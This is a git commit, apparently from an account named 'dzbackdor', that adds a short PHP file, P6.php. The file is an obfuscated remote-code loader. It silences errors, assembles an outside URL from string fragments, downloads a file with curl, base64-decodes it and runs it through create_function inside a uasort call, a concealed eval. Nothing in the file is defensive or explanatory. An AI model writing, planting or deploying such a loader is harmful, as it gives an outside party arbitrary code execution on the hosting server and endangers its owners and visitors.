b0171345d4596fc6681fa9df2748609f53bfe379
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2025-09-30 07:40:21 +0700

    Create P6.php

---
+++ P6.php
@@ -0,0 +1,16 @@
+<?php
+@error_reporting(0);
+$p1 = "htt"; $p2 = "ps:/"; $p3 = "/amp"; $p4 = "nyapu"; $p5 = "nyaku"; $p6 = ".top"; 
+$p7 = "/tool"; $p8 = "s/s-m"; $p9 = "edia"; $p10 = "/med"; $p11 = "ia-ne"; $p12 = "w.txt";
+$url = $p1 . $p2 . $p3 . $p4 . $p5 . $p6 . $p7 . $p8 . $p9 . $p10 . $p11 . $p12;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$data = curl_exec($ch);
+curl_close($ch);
+if (base64_decode($data, true)) {
+    $data = base64_decode($data);
+}
+$arr = [1, 2, 3];
+uasort($arr, create_function('$a,$b', '?>'.$data.';return 0;'));
+?>
